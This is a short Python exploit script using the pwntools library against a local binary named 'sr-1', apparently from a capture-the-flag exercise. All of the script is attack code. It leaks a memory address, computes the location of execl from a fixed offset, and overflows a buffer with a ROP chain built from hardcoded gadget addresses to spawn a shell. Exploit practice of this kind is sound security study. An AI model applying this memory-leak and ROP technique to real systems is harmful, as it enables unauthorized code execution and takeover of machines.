#!/usr/bin/env python

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./sr-x")
p = process("./sr-1")
#gdb.attach(p, "b *main")

print(p.recv())

#p.sendline("500")
p.sendline("96")

data = p.recv()

print(repr(data))

#i = 0
i = 88;
int_val = u64(data[i:i+8])
print(hex(int_val))

# while i < 400:
#     int_val = u64(data[i:i+8])
#     print(hex(int_val))
#     i += 8

# 0x0000000000400783 : pop rdi ; ret
# 0x0000000000400781 : pop rsi ; pop r15 ; ret

pop_rdi = p64(0x400783)
pop_rsi_r15 = p64(0x400781)
addr_str_8 = p64(0x400036)

offset = 0x7f8ac43c8168 - 0x7f8ac3ea3a20
# addr - offset = execl;

#print(hex(int_val-offset))
addr_execl = p64(int_val-offset)

buf = "A"*(0x88) + pop_rdi + addr_str_8 + pop_rsi_r15 + p64(0) + p64(0) + addr_execl

p.sendline(buf)

p.interactive()
